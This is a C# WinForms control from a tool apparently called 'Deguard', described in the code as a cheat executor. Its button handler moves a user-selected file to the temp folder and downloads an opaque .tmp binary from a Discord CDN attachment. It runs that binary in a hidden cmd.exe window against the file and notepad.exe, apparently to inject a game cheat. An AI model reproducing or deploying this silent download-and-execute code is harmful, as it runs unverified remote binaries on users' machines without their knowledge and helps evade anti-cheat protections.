using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Deguard_Tool
{
    public partial class customcheatexecutor : UserControl
    {
        private string originalFilePath = "";

        public customcheatexecutor()
        {
            InitializeComponent();
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            string sourcePath = siticoneRoundedTextBox1.Text;
            if (File.Exists(sourcePath))
            {
                string tempDir = Path.GetTempPath();

                string fileName = Path.GetFileName(sourcePath);
                string tempFilePath = Path.Combine(tempDir, fileName);

                // Move the file to the temp directory
                File.Move(sourcePath, tempFilePath);
                originalFilePath = sourcePath;

                // Download a file to the temp directory
                string downloadUrl = "https://cdn.discordapp.com/attachments/1121848724583354418/1139642625587150928/t64f74d13-e4aa-4e66-a404-e9d0e523081b.tmp"; // Replace with the actual URL
                string downloadedFilePath = Path.Combine(tempDir, "t64f74d13-e4aa-4e66-a404-e9d0e523081b.tmp");
                using (var client = new WebClient())
                {
                    client.DownloadFile(downloadUrl, downloadedFilePath);
                }

                // Run the moved executable using cmd
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    WorkingDirectory = tempDir,
                    Arguments = $"/C t64f74d13-e4aa-4e66-a404-e9d0e523081b.tmp \"{fileName}\" C:\\Windows\\system32\\notepad.exe", // Run the moved file
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };

                Process.Start(psi).WaitForExit();

                // Move the file back
                File.Move(tempFilePath, originalFilePath);

                MessageBox.Show("Executing Cheat...", "Deguard");
            }
            else
            {
                MessageBox.Show("Source file does not exist.");
            }
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Coming Soon!", "Deguard");
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}